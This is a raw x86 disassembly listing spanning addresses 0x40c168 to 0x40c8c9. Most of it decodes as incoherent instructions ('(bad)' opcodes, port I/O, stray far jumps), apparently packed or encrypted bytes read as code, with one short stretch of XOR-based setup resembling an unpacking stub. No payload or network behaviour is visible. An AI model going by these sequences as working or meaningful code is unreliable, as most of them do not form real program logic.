  40c168:	push   edi
  40c169:	and    cl,al
  40c16b:	or     ebx,ebp
  40c16d:	jge    0x40c15f
  40c16f:	cmp    BYTE PTR [ecx-0xa],cl
  40c172:	inc    esp
  40c173:	fld    st(0)
  40c175:	cmp    ebx,DWORD PTR [ecx+0x1b01907a]
  40c17b:	imul   esi,DWORD PTR [ecx],0xc9a43f3b
  40c181:	mov    ecx,esi
  40c183:	sahf   
  40c184:	push   ebp
  40c185:	cdq    
  40c186:	ja     0x40c1fc
  40c188:	sub    esi,DWORD PTR [esi+0x7f]
  40c18b:	or     al,0xd6
  40c18d:	inc    edi
  40c18e:	adc    BYTE PTR [edi],bl
  40c190:	lods   al,BYTE PTR ds:[esi]
  40c191:	adc    eax,DWORD PTR [esi]
  40c193:	add    dl,bh
  40c195:	fs push eax
  40c197:	fsub   QWORD PTR [ebx+0x64]
  40c19a:	cli    
  40c19b:	test   eax,0x48d8618a
  40c1a0:	enter  0x169f,0x93
  40c1a4:	mov    ds:0xa0596aef,eax
  40c1a9:	push   0x290ff039
  40c1ae:	dec    esp
  40c1af:	sbb    BYTE PTR [esi-0x3b],cl
  40c1b2:	add    DWORD PTR [ecx-0x7],edi
  40c1b5:	daa    
  40c1b6:	fild   QWORD PTR [ecx]
  40c1b8:	std    
  40c1b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1ba:	imul   BYTE PTR [edi+0x32cab706]
  40c1c0:	push   ecx
  40c1c1:	inc    edi
  40c1c2:	cmp    dl,dl
  40c1c4:	ds push edx
  40c1c6:	sahf   
  40c1c7:	xchg   ebx,eax
  40c1c8:	mov    WORD PTR [esp+eiz*2-0x2c3db083],ss
  40c1cf:	mov    esi,0xb89a531b
  40c1d4:	pusha  
  40c1d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1d6:	xor    bl,BYTE PTR [ebp-0x78]
  40c1d9:	inc    edi
  40c1da:	jecxz  0x40c220
  40c1dc:	xor    BYTE PTR ds:[ecx+0x33],bh
  40c1e0:	in     al,0xb
  40c1e2:	scas   eax,DWORD PTR es:[edi]
  40c1e3:	shl    BYTE PTR [ecx-0x21],0x2
  40c1e7:	mov    al,ds:0xf5cd97cf
  40c1ec:	mov    ah,0x5c
  40c1ee:	jle    0x40c245
  40c1f0:	or     ah,BYTE PTR [esi+0x3a72493b]
  40c1f6:	mov    esp,0x971eb4e7
  40c1fb:	pop    ss
  40c1fc:	add    al,0xa5
  40c1fe:	mov    cl,0x61
  40c200:	push   ss
  40c201:	mul    BYTE PTR [esi+0x6f360328]
  40c207:	scas   eax,DWORD PTR es:[edi]
  40c208:	mov    BYTE PTR [ebp-0x4e],bh
  40c20b:	pushf  
  40c20c:	leave  
  40c20d:	test   eax,0x125797
  40c212:	ds mov cl,0x80
  40c215:	in     al,dx
  40c216:	repz sahf 
  40c218:	lods   eax,DWORD PTR ds:[esi]
  40c219:	xor    eax,0xcd8e4727
  40c21e:	fcom   st(4)
  40c220:	sbb    eax,0xe7492a3d
  40c225:	mov    cl,0x2e
  40c227:	ds and eax,0xbc368f87
  40c22d:	pop    ebx
  40c22e:	das    
  40c22f:	jnp    0x40c290
  40c231:	loopne 0x40c2aa
  40c233:	repnz dec esi
  40c235:	out    0x60,eax
  40c237:	test   BYTE PTR [ebx],cl
  40c239:	lods   eax,DWORD PTR ds:[esi]
  40c23a:	push   esp
  40c23b:	mov    al,ds:0x9d3487a0
  40c240:	popa   
  40c241:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c242:	(bad)  
  40c243:	clc    
  40c244:	ss stos BYTE PTR es:[edi],al
  40c246:	mov    dl,0x40
  40c248:	(bad)  
  40c249:	in     al,dx
  40c24a:	add    eax,DWORD PTR [eax+0x2f]
  40c24d:	adc    BYTE PTR [ebx-0x23],0xa2
  40c251:	xchg   edi,eax
  40c252:	(bad)  
  40c253:	imul   edi,eax,0x789947c1
  40c259:	clc    
  40c25a:	push   ebp
  40c25b:	xor    eax,0xc873e2b1
  40c260:	loop   0x40c2b5
  40c262:	bound  ebp,QWORD PTR [ecx+0x24]
  40c265:	jg     0x40c2dc
  40c267:	cmp    DWORD PTR [ebx+ebp*4-0x5225cfb2],ebp
  40c26e:	sahf   
  40c26f:	mov    BYTE PTR [ebx+0x194947ed],al
  40c275:	out    0x4d,al
  40c277:	mov    esi,0xc759359b
  40c27c:	cli    
  40c27d:	jns    0x40c293
  40c27f:	and    eax,esi
  40c281:	mov    edx,DWORD PTR [ebp-0x10]
  40c284:	lds    eax,FWORD PTR [edx]
  40c286:	fwait
  40c287:	or     eax,0x5f591133
  40c28c:	mov    edi,0x9ce945bc
  40c291:	or     edi,DWORD PTR [eax+0x3a]
  40c294:	jbe    0x40c241
  40c296:	fwait
  40c297:	test   dh,dh
  40c299:	xchg   ebp,eax
  40c29a:	add    al,0x4b
  40c29c:	cmp    cl,BYTE PTR [ecx]
  40c29e:	lock mov eax,ds:0x921775cf
  40c2a4:	xchg   ebp,eax
  40c2a5:	mov    cl,0x3a
  40c2a7:	lods   eax,DWORD PTR ds:[esi]
  40c2a8:	hlt    
  40c2a9:	dec    esi
  40c2aa:	push   ebp
  40c2ab:	mov    ah,0x40
  40c2ad:	mov    al,ds:0xf53f7d44
  40c2b2:	cmp    dl,BYTE PTR [edi-0x409a8cb0]
  40c2b8:	inc    edx
  40c2b9:	pop    ds
  40c2ba:	add    eax,0xac6e0aba
  40c2bf:	and    BYTE PTR [ecx+0x32],cl
  40c2c2:	mov    bl,0xbb
  40c2c4:	test   eax,0xbbdeeaf1
  40c2c9:	jns    0x40c26c
  40c2cb:	das    
  40c2cc:	push   ebp
  40c2cd:	loope  0x40c27e
  40c2cf:	inc    edi
  40c2d0:	test   ebp,esi
  40c2d2:	inc    ecx
  40c2d3:	cwde   
  40c2d4:	sahf   
  40c2d5:	retf   
  40c2d6:	in     al,0x4
  40c2d8:	add    eax,edi
  40c2da:	xor    DWORD PTR [ecx],ecx
  40c2dc:	push   ebx
  40c2dd:	mov    es,WORD PTR [eax]
  40c2df:	icebp  
  40c2e0:	mov    bh,0xd7
  40c2e2:	adc    esp,DWORD PTR [ecx-0x67d6c8f]
  40c2e8:	rol    ebp,0x4b
  40c2eb:	mov    edi,0xfa0a470d
  40c2f0:	fsubrp st(4),st
  40c2f2:	aas    
  40c2f3:	jns    0x40c335
  40c2f5:	out    0xa6,eax
  40c2f7:	in     eax,dx
  40c2f8:	mov    dh,0x6b
  40c2fa:	sbb    bh,BYTE PTR gs:[ecx-0x1256362]
  40c301:	sbb    BYTE PTR [esi-0x354251b8],0x2d
  40c308:	fld    TBYTE PTR [eax+0x39055699]
  40c30e:	aad    0x42
  40c310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c311:	sub    eax,0x1775f6fb
  40c316:	xor    edi,eax
  40c318:	idiv   bl
  40c31a:	and    eax,0x3f4cffa2
  40c31f:	mov    WORD PTR [edi+ebp*1+0x61],cs
  40c323:	inc    ebx
  40c324:	inc    ecx
  40c325:	adc    bl,BYTE PTR [esi]
  40c327:	lods   eax,DWORD PTR ds:[esi]
  40c328:	jmp    0x5762:0x206e7078
  40c32f:	xchg   esp,eax
  40c330:	cs push cs
  40c332:	sbb    bh,BYTE PTR [edi-0x27c846b3]
  40c338:	dec    esp
  40c339:	mov    fs,eax
  40c33b:	cmc    
  40c33c:	test   DWORD PTR ds:0x82e5a52c,0x19bd194e
  40c346:	push   es
  40c347:	cmp    BYTE PTR [edx-0x6],cl
  40c34a:	ins    DWORD PTR es:[edi],dx
  40c34b:	addr16 xor eax,0x41711658
  40c351:	stos   DWORD PTR es:[edi],eax
  40c352:	ficom  DWORD PTR [ecx+0x34fe85f8]
  40c358:	and    eax,0x8ac567e6
  40c35d:	and    cl,ah
  40c35f:	xor    BYTE PTR [ebx],al
  40c361:	mov    dh,0xdd
  40c363:	sbb    BYTE PTR [ebx+0x4],ch
  40c366:	jge    0x40c352
  40c368:	mov    WORD PTR [edx-0x6],es
  40c36b:	daa    
  40c36c:	cmp    DWORD PTR [ebx],eax
  40c36e:	jmp    0x40c39e
  40c370:	inc    esp
  40c371:	or     eax,0xb7fa2ff5
  40c376:	cs cmp eax,0x4045dd75
  40c37c:	fwait
  40c37d:	sub    eax,0x81348cfd
  40c382:	into   
  40c383:	jge    0x40c326
  40c385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c386:	sub    eax,0x6d967fff
  40c38b:	enter  0x89f2,0x5d
  40c38f:	or     al,0xbe
  40c391:	add    eax,0xfff0f506
  40c396:	mov    ds:0x8e84d66f,eax
  40c39b:	daa    
  40c39c:	out    dx,al
  40c39d:	fsubr  st,st(1)
  40c39f:	(bad)  
  40c3a0:	jns    0x40c323
  40c3a2:	lea    ebx,[edi-0x77]
  40c3a5:	outs   dx,BYTE PTR ds:[esi]
  40c3a6:	and    DWORD PTR [ebp+0x5e],ecx
  40c3a9:	(bad)  
  40c3aa:	ins    DWORD PTR es:[edi],dx
  40c3ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3ac:	add    BYTE PTR [edi-0x38],dl
  40c3af:	and    BYTE PTR [eax+0x7],dh
  40c3b2:	ret    
  40c3b3:	fnstcw WORD PTR [ebx+eiz*4-0x11b8efee]
  40c3ba:	sbb    esi,DWORD PTR [edi-0x4c5f3aff]
  40c3c0:	or     al,0xe
  40c3c2:	inc    edi
  40c3c3:	push   ebx
  40c3c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3c5:	sbb    eax,0xd742fe4d
  40c3ca:	shl    DWORD PTR [edi+ebp*8-0x52381c07],1
  40c3d1:	pop    ebp
  40c3d2:	pop    edi
  40c3d3:	sbb    eax,0x75cc2a11
  40c3d8:	(bad)  
  40c3d9:	mov    edx,0x3b3db368
  40c3de:	scas   eax,DWORD PTR es:[edi]
  40c3df:	mov    ds,eax
  40c3e1:	dec    esi
  40c3e2:	popf   
  40c3e3:	inc    ecx
  40c3e4:	push   ebx
  40c3e5:	(bad)  
  40c3e6:	leave  
  40c3e7:	push   ecx
  40c3e8:	aam    0x6a
  40c3ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3eb:	enter  0x7072,0x23
  40c3ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3f0:	es mov ecx,0xebbcfea
  40c3f6:	in     al,dx
  40c3f7:	sbb    BYTE PTR [edi-0x21],0xcc
  40c3fb:	mov    edx,0x1dabfc16
  40c400:	add    eax,0x3dee2276
  40c405:	mov    ?,WORD PTR [esi+0x64]
  40c408:	bound  edi,QWORD PTR ds:0x3cc1445d
  40c40e:	mov    ecx,es
  40c410:	lock mov bh,0xc5
  40c413:	push   ebp
  40c414:	pop    ecx
  40c415:	bound  esi,QWORD PTR [ebx]
  40c417:	(bad)  
  40c418:	adc    bl,BYTE PTR [eax+edx*1+0x347acebf]
  40c41f:	loope  0x40c3ac
  40c421:	gs push esp
  40c423:	retf   0x1087
  40c426:	addr16 cld 
  40c428:	test   BYTE PTR [eax],0x79
  40c42b:	inc    ecx
  40c42c:	or     ch,BYTE PTR [esi+0x13b6126b]
  40c432:	retf   
  40c433:	pusha  
  40c434:	push   esi
  40c435:	int3   
  40c436:	(bad)  
  40c437:	inc    edi
  40c438:	sbb    ecx,DWORD PTR [edx+edx*2+0x60]
  40c43c:	inc    esi
  40c43d:	push   eax
  40c43e:	adc    cl,BYTE PTR [eax-0x7145a4ad]
  40c444:	sbb    esi,DWORD PTR [edi]
  40c446:	repnz inc esp
  40c448:	sbb    al,0xe9
  40c44a:	dec    ebp
  40c44b:	jb     0x40c483
  40c44d:	mov    edx,DWORD PTR [esi]
  40c44f:	stos   BYTE PTR es:[edi],al
  40c450:	into   
  40c451:	sub    ax,0x6481
  40c455:	push   cs
  40c456:	push   ebp
  40c457:	sub    eax,0xabaaa8a2
  40c45c:	inc    esp
  40c45d:	fcom   DWORD PTR [edi]
  40c45f:	cmp    DWORD PTR [ebp-0x65],ebp
  40c462:	mov    dl,0xd1
  40c464:	(bad)  
  40c465:	out    dx,al
  40c466:	fwait
  40c467:	iret   
  40c468:	jl     0x40c413
  40c46a:	dec    edi
  40c46b:	fld    DWORD PTR [edx+0x6e]
  40c46e:	je     0x40c482
  40c470:	or     ebx,DWORD PTR [edi+0x42]
  40c473:	dec    ebx
  40c474:	add    DWORD PTR es:[ebx],eax
  40c477:	inc    ecx
  40c478:	adc    bh,al
  40c47a:	call   0xb0bb34c6
  40c47f:	push   ss
  40c480:	je     0x40c4a8
  40c482:	dec    eax
  40c483:	push   0xffffffb5
  40c485:	adc    esi,DWORD PTR [esi+ebp*2]
  40c488:	pop    esi
  40c489:	mov    eax,0xab69c3ce
  40c48e:	add    bl,BYTE PTR [ebx-0x5]
  40c491:	inc    BYTE PTR [ebx-0x67]
  40c494:	sbb    bl,BYTE PTR [edi]
  40c496:	sbb    bh,BYTE PTR [eax+0x2aecb051]
  40c49c:	rol    DWORD PTR [ecx-0x12af03d5],0x4f
  40c4a3:	in     eax,dx
  40c4a4:	outs   dx,BYTE PTR ds:[esi]
  40c4a5:	pushf  
  40c4a6:	mov    bh,0xb3
  40c4a8:	loope  0x40c44b
  40c4aa:	imul   eax,DWORD PTR [eax+edi*2-0x4e],0x39
  40c4af:	jmp    0x669c7178
  40c4b4:	(bad)  
  40c4b5:	jmp    0x40c518
  40c4b7:	into   
  40c4b8:	sbb    edi,DWORD PTR [ebx+0x1b7c6fa0]
  40c4be:	add    DWORD PTR [ebx+0x2df5b17b],0x403d0f4c
  40c4c8:	sti    
  40c4c9:	mov    edi,0x4781bc02
  40c4ce:	jle    0x40c4da
  40c4d0:	xor    eax,0x5e0a95ec
  40c4d5:	in     eax,dx
  40c4d6:	fwait
  40c4d7:	sub    eax,esp
  40c4d9:	(bad)  
  40c4da:	enter  0x37ff,0xd6
  40c4de:	hlt    
  40c4df:	cmp    BYTE PTR fs:[edx],al
  40c4e2:	sbb    edi,DWORD PTR [esi+0x172e1e8a]
  40c4e8:	out    0x23,al
  40c4ea:	pop    es
  40c4eb:	mov    cs,esp
  40c4ed:	inc    edi
  40c4ee:	fimul  WORD PTR [ecx-0x16]
  40c4f1:	mov    al,ds:0xd7af0f7b
  40c4f6:	mov    DWORD PTR [ebp+0xc],edx
  40c4f9:	mov    edx,DWORD PTR [ebp+0xc]
  40c4fc:	mov    DWORD PTR [ebp-0x24],edx
  40c4ff:	mov    edx,DWORD PTR [ebp-0x8]
  40c502:	add    edx,DWORD PTR [ebp-0x40]
  40c505:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40c50c:	mov    DWORD PTR [ebp-0x1c],edx
  40c50f:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  40c516:	mov    DWORD PTR [ebp-0x44],0xf89c8538
  40c51d:	mov    edx,DWORD PTR [ebp-0x18]
  40c520:	xor    edx,eax
  40c522:	add    edx,ecx
  40c524:	jmp    0x40cdbf
  40c529:	mov    edx,DWORD PTR [ebp-0x18]
  40c52c:	xor    edx,eax
  40c52e:	jmp    0x40c945
  40c533:	sub    al,0x9b
  40c535:	inc    edx
  40c536:	(bad)  
  40c537:	dec    ebp
  40c538:	idiv   DWORD PTR [ebp+esi*2-0x2cf58fc4]
  40c53f:	mov    al,ds:0xd0eea854
  40c544:	xchg   esi,eax
  40c545:	jle    0x40c5c5
  40c547:	jo     0x40c5c2
  40c549:	jle    0x40c5c9
  40c54b:	bound  edi,QWORD PTR [ecx+0x79]
  40c54e:	push   cs
  40c54f:	xor    ecx,ecx
  40c551:	cmp    BYTE PTR [ebx+0x13767475],0xd
  40c558:	jl     0x40c4eb
  40c55a:	fild   DWORD PTR [eax+0x6e4ff90f]
  40c560:	pop    es
  40c561:	push   ebx
  40c562:	pop    esp
  40c563:	and    al,0x42
  40c565:	xor    ah,cl
  40c567:	sub    eax,edx
  40c569:	nop
  40c56a:	cmc    
  40c56b:	jns    0x40c4f4
  40c56d:	aaa    
  40c56e:	jo     0x40c5b1
  40c570:	mov    al,ds:0xf8b92461
  40c575:	stos   DWORD PTR es:[edi],eax
  40c576:	mov    esp,0x44d2d7e6
  40c57b:	hlt    
  40c57c:	test   eax,0x5961482f
  40c581:	repnz inc ebx
  40c583:	sbb    BYTE PTR ds:0xf66ec3de,0x40
  40c58a:	retf   0xa816
  40c58d:	inc    edx
  40c58e:	out    0x31,eax
  40c590:	call   0xd95b:0xd3f0ae7
  40c597:	xchg   edi,eax
  40c598:	sub    BYTE PTR [eax-0x65aaa9c8],bh
  40c59e:	jmp    0x40c5b8
  40c5a0:	add    ch,dh
  40c5a2:	cld    
  40c5a3:	leave  
  40c5a4:	and    al,BYTE PTR ds:0x9d03
  40c5a9:	jo     0x40c59a
  40c5ab:	lods   al,BYTE PTR ds:[esi]
  40c5ac:	inc    ebp
  40c5ad:	mov    esp,0xcc9ff1e2
  40c5b2:	cld    
  40c5b3:	xor    esi,esp
  40c5b5:	call   FWORD PTR [ecx+edi*8-0x6a]
  40c5b9:	fmul   DWORD PTR [ecx]
  40c5bb:	dec    ebp
  40c5bc:	adc    bl,0x8
  40c5bf:	jmp    0xe6cf:0x449d27a5
  40c5c6:	sub    al,0xc6
  40c5c8:	inc    ebp
  40c5c9:	xchg   ebp,eax
  40c5ca:	cld    
  40c5cb:	loop   0x40c5f1
  40c5cd:	(bad)  
  40c5ce:	xor    ebx,DWORD PTR [eax-0x4ecb01b1]
  40c5d4:	dec    eax
  40c5d5:	ins    BYTE PTR es:[edi],dx
  40c5d6:	pop    es
  40c5d7:	mov    edi,ecx
  40c5d9:	sbb    BYTE PTR [edi+eax*2+0x6549d6c8],bl
  40c5e0:	lea    edx,[edi+0x229e29b0]
  40c5e6:	shl    BYTE PTR [ebp-0x39],1
  40c5e9:	jo     0x40c59a
  40c5eb:	mov    bl,0x34
  40c5ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5ee:	cmp    cl,BYTE PTR [ecx+0x413774ff]
  40c5f4:	sub    BYTE PTR [edi],dh
  40c5f6:	push   0xe7296108
  40c5fb:	cmp    ch,BYTE PTR [ebx-0x14]
  40c5fe:	pop    esi
  40c5ff:	out    dx,eax
  40c600:	cs push cs
  40c602:	or     dl,BYTE PTR [eax]
  40c604:	pop    es
  40c605:	inc    esp
  40c606:	inc    ebx
  40c607:	outs   dx,DWORD PTR ds:[esi]
  40c608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c609:	push   ds
  40c60a:	pusha  
  40c60b:	std    
  40c60c:	mov    WORD PTR [ebx+0x33b1bedc],?
  40c612:	push   DWORD PTR ds:0x800dc5d4
  40c618:	repnz mov DWORD PTR [edi+0x21],0x698b29ef
  40c620:	jl     0x40c66d
  40c622:	cmp    eax,DWORD PTR [eax-0x64]
  40c625:	cmp    ch,ah
  40c627:	jge    0x40c624
  40c629:	int    0xb4
  40c62b:	xor    al,0x73
  40c62d:	adc    ecx,esp
  40c62f:	mov    ecx,0x6d0bc1a7
  40c634:	jl     0x40c623
  40c636:	jb     0x40c5f2
  40c638:	pop    ecx
  40c639:	and    eax,0xad8944c6
  40c63e:	aad    0x97
  40c640:	pop    esp
  40c641:	jg     0x40c62c
  40c643:	push   ss
  40c644:	mov    esi,0x228ee7
  40c649:	add    al,bh
  40c64b:	(bad)  
  40c64c:	sbb    BYTE PTR ds:0x8d26213a,0xd6
  40c653:	push   esi
  40c654:	lock xlat BYTE PTR ds:[ebx]
  40c656:	mov    edx,0xce2d681f
  40c65b:	or     eax,0x8d73cf9a
  40c660:	cbw    
  40c662:	ss mov ch,0x31
  40c665:	into   
  40c666:	push   ss
  40c667:	sbb    al,0x42
  40c669:	mov    ah,BYTE PTR [esi]
  40c66b:	mov    ebx,0x855adf63
  40c670:	int    0xbd
  40c672:	in     al,0x75
  40c674:	pushf  
  40c675:	outs   dx,DWORD PTR ds:[esi]
  40c676:	xchg   esi,eax
  40c677:	hlt    
  40c678:	mov    cl,0x69
  40c67a:	clc    
  40c67b:	jg     0x40c602
  40c67d:	mov    eax,ds:0x1f650223
  40c682:	sub    BYTE PTR [esi-0x11],bh
  40c685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c686:	xchg   ebx,eax
  40c687:	jbe    0x40c6b8
  40c689:	xor    edx,eax
  40c68b:	sbb    al,0x5c
  40c68d:	aad    0x6
  40c68f:	mov    ah,0xed
  40c691:	lds    ecx,FWORD PTR [edi-0x24]
  40c694:	les    edi,FWORD PTR [eax+0x7bbebf5a]
  40c69a:	adc    ecx,edx
  40c69c:	lock mov eax,ds:0x80482691
  40c6a2:	pop    esi
  40c6a3:	retf   
  40c6a4:	fdivr  QWORD PTR [ebx]
  40c6a6:	or     eax,0x207e603d
  40c6ab:	sbb    ch,al
  40c6ad:	pop    ebx
  40c6ae:	inc    ecx
  40c6af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6b0:	mov    bh,0x6f
  40c6b2:	and    ah,BYTE PTR [edx-0xed7c72b]
  40c6b8:	scas   al,BYTE PTR es:[edi]
  40c6b9:	outs   dx,BYTE PTR ds:[esi]
  40c6ba:	ja     0x40c64e
  40c6bc:	push   ds
  40c6bd:	push   eax
  40c6be:	dec    esi
  40c6bf:	push   eax
  40c6c0:	dec    ecx
  40c6c1:	xchg   esp,eax
  40c6c2:	jo     0x40c66b
  40c6c4:	ins    DWORD PTR es:[edi],dx
  40c6c5:	xor    edi,DWORD PTR [ebx+esi*4]
  40c6c8:	retf   0x8b9c
  40c6cb:	or     bl,ah
  40c6cd:	inc    ebp
  40c6ce:	and    bl,BYTE PTR [ecx]
  40c6d0:	xchg   edx,eax
  40c6d1:	fadd   DWORD PTR [eax]
  40c6d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6d4:	push   ebp
  40c6d5:	sub    dl,ah
  40c6d7:	adc    al,cl
  40c6d9:	push   ebx
  40c6da:	sbb    al,0xec
  40c6dc:	push   ss
  40c6dd:	test   ebx,ebp
  40c6df:	add    cl,BYTE PTR [edi]
  40c6e1:	das    
  40c6e2:	push   eax
  40c6e3:	in     al,dx
  40c6e4:	or     BYTE PTR [ebx],0xab
  40c6e7:	rcl    dl,1
  40c6e9:	retf   0x24bb
  40c6ec:	in     eax,0x14
  40c6ee:	test   al,0xb0
  40c6f0:	jne    0x40c67c
  40c6f2:	test   al,0x73
  40c6f4:	jecxz  0x40c6a3
  40c6f6:	int3   
  40c6f7:	popf   
  40c6f8:	sbb    eax,0xe3e2d291
  40c6fd:	jle    0x40c6b6
  40c6ff:	push   es
  40c700:	jmp    0x40c760
  40c702:	pop    esp
  40c703:	cwde   
  40c704:	jg     0x40c6f1
  40c706:	pop    ebx
  40c707:	jbe    0x40c6f0
  40c709:	fsub   QWORD PTR [ecx-0x61897ce4]
  40c70f:	xchg   edx,eax
  40c710:	add    al,0xdd
  40c712:	dec    esi
  40c713:	ret    0x4ff7
  40c716:	fisub  WORD PTR [ecx-0x77]
  40c719:	add    ah,BYTE PTR [edi+eiz*8-0x4020b7e1]
  40c720:	movhps QWORD PTR [esi-0x4fc3aa02],xmm7
  40c727:	ret    0x4642
  40c72a:	nop
  40c72b:	ss mov ah,0x9c
  40c72e:	and    bh,al
  40c730:	jns    0x40c7a2
  40c732:	xchg   ebx,eax
  40c733:	(bad)  
  40c734:	iret   
  40c735:	cs stos WORD PTR es:[edi],ax
  40c738:	pop    DWORD PTR [ebx+0x43fbc6bd]
  40c73e:	and    ecx,DWORD PTR [esi-0x3420cd77]
  40c744:	dec    ecx
  40c745:	jns    0x40c6e1
  40c747:	(bad)  
  40c749:	mov    es,WORD PTR [ebx-0x3a132f04]
  40c74f:	add    BYTE PTR [ebp-0x16],dh
  40c752:	iret   
  40c753:	or     eax,0x95a7ec7d
  40c758:	mov    edi,DWORD PTR [edx-0x3ec2442a]
  40c75e:	sub    al,BYTE PTR [edx]
  40c760:	ins    BYTE PTR es:[edi],dx
  40c761:	sbb    DWORD PTR [edi],edi
  40c763:	xchg   BYTE PTR [ecx-0x30],cl
  40c766:	pushf  
  40c767:	xchg   ebp,eax
  40c768:	(bad)
  40c76b:	and    esp,esi
  40c76d:	fsub   DWORD PTR ds:0x33fd840d
  40c773:	or     dl,BYTE PTR [ebp+0x79612b84]
  40c779:	or     BYTE PTR [eax-0x61],bl
  40c77c:	cmc    
  40c77d:	test   eax,0xbda56fbf
  40c782:	jmp    0xb75e3c6c
  40c787:	sbb    ecx,edx
  40c789:	in     eax,dx
  40c78a:	push   edi
  40c78b:	or     dh,BYTE PTR [esi]
  40c78d:	push   edx
  40c78e:	adc    eax,0x8283d85e
  40c793:	pop    esi
  40c794:	inc    ebp
  40c795:	ja     0x40c814
  40c797:	mov    al,bh
  40c799:	xor    DWORD PTR [eax],ecx
  40c79b:	pop    edi
  40c79c:	jecxz  0x40c774
  40c79e:	pop    ebp
  40c79f:	pop    ecx
  40c7a0:	mov    ah,0x50
  40c7a2:	xchg   esi,eax
  40c7a3:	xchg   esi,eax
  40c7a4:	lea    ebp,[ebp+ebp*2+0x48]
  40c7a8:	inc    edi
  40c7a9:	loopne 0x40c812
  40c7ab:	dec    esi
  40c7ac:	mov    fs,WORD PTR [ebx+0x4]
  40c7af:	push   0x85519b28
  40c7b4:	jge    0x40c749
  40c7b6:	push   ebp
  40c7b7:	outs   dx,DWORD PTR ds:[esi]
  40c7b8:	ror    DWORD PTR [esi],cl
  40c7ba:	je     0x40c7c1
  40c7bc:	and    eax,0x1e52270
  40c7c1:	pop    ebx
  40c7c2:	mov    esp,esi
  40c7c4:	inc    esp
  40c7c5:	sar    DWORD PTR [ecx+eiz*1+0x54],cl
  40c7c9:	fiadd  WORD PTR [ebp-0x598eb9f1]
  40c7cf:	pushf  
  40c7d0:	mov    ds:0x3271be31,al
  40c7d5:	(bad)  
  40c7d6:	nop
  40c7d7:	lds    ebx,FWORD PTR [esi-0x5c]
  40c7da:	int3   
  40c7db:	enter  0xce81,0xf7
  40c7df:	std    
  40c7e0:	jne    0x40c85c
  40c7e2:	pop    ss
  40c7e3:	shl    BYTE PTR [eax-0x1f],cl
  40c7e6:	jae    0x40c7b1
  40c7e8:	repnz inc esi
  40c7ea:	add    dl,al
  40c7ec:	sub    al,0x9c
  40c7ee:	in     al,dx
  40c7ef:	bound  edi,QWORD PTR [ecx]
  40c7f1:	mov    ebx,DWORD PTR [ecx]
  40c7f3:	add    ch,bl
  40c7f5:	jmp    0xe10a8c8e
  40c7fa:	mov    esi,esp
  40c7fc:	nop
  40c7fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7fe:	cmp    bl,bl
  40c800:	mov    edx,0x811912d6
  40c805:	and    BYTE PTR [edi],ch
  40c807:	not    dl
  40c809:	(bad)  
  40c80a:	sti    
  40c80b:	mov    ds:0x5234015a,eax
  40c810:	nop
  40c811:	rcr    DWORD PTR [ecx+0x24],1
  40c814:	ins    DWORD PTR es:[edi],dx
  40c815:	push   esi
  40c816:	in     eax,dx
  40c817:	aam    0xaa
  40c819:	cmp    DWORD PTR [esi-0x564ed4c2],esp
  40c81f:	pop    ebp
  40c820:	lahf   
  40c821:	sbb    al,0x2c
  40c823:	sub    esp,DWORD PTR [ebp-0x10bf380b]
  40c829:	fnstcw WORD PTR [esi+0x17]
  40c82c:	push   cs
  40c82d:	data16 fidiv WORD PTR [edx+0x428435d1]
  40c834:	dec    edi
  40c835:	xchg   ecx,eax
  40c836:	or     ebx,DWORD PTR [esi-0x53]
  40c839:	daa    
  40c83a:	adc    DWORD PTR [edi],ecx
  40c83c:	jne    0x40c821
  40c83e:	dec    si
  40c840:	push   esi
  40c841:	(bad)  
  40c842:	xlat   BYTE PTR ds:[ebx]
  40c843:	arpl   WORD PTR [edi-0xe81b463],bp
  40c849:	bound  edx,QWORD PTR [ebx]
  40c84b:	jo     0x40c83c
  40c84d:	(bad)  
  40c84e:	cmp    eax,0x4c03dcf8
  40c853:	mov    eax,0x62e57ba5
  40c858:	(bad)  
  40c859:	lahf   
  40c85a:	out    0x30,eax
  40c85c:	mov    eax,0x3b788c66
  40c861:	sbb    BYTE PTR [edi],dl
  40c863:	call   0xbfc27fad
  40c868:	add    eax,0x1501786b
  40c86d:	and    edx,DWORD PTR cs:[edx-0x7]
  40c871:	cmc    
  40c872:	test   al,0xf6
  40c874:	stc    
  40c875:	inc    edi
  40c876:	scas   al,BYTE PTR es:[edi]
  40c877:	std    
  40c878:	xchg   edx,eax
  40c879:	ror    BYTE PTR ds:0x112fdd97,cl
  40c87f:	jns    0x40c8da
  40c881:	xor    eax,0x68e87ae4
  40c886:	(bad)  
  40c887:	loop   0x40c8bb
  40c889:	mov    WORD PTR [ebx-0x26],?
  40c88c:	sar    ebx,0x97
  40c88f:	sbb    al,0x1f
  40c891:	pushf  
  40c892:	add    edi,DWORD PTR [eax+ebx*2]
  40c895:	test   BYTE PTR [ecx],cl
  40c897:	adc    bh,BYTE PTR [esp+ecx*2+0x6b]
  40c89b:	sbb    edi,DWORD PTR [ebx+0x14ee16b2]
  40c8a1:	and    eax,0x5c88e14f
  40c8a6:	pop    ebp
  40c8a7:	xor    ah,al
  40c8a9:	mov    ?,WORD PTR [ebx+0x5e]
  40c8ac:	lods   al,BYTE PTR ds:[esi]
  40c8ad:	or     eax,0x9bb2d345
  40c8b2:	call   0x44d53c0a
  40c8b7:	jno    0x40c8b4
  40c8b9:	ficom  WORD PTR [esi+0x55607589]
  40c8bf:	in     al,dx
  40c8c0:	mov    ebp,0xfe662304
  40c8c5:	sub    DWORD PTR [eax+0x77],ebp
  40c8c8:	cli    
  40c8c9:	jmp    0x7e789d3d
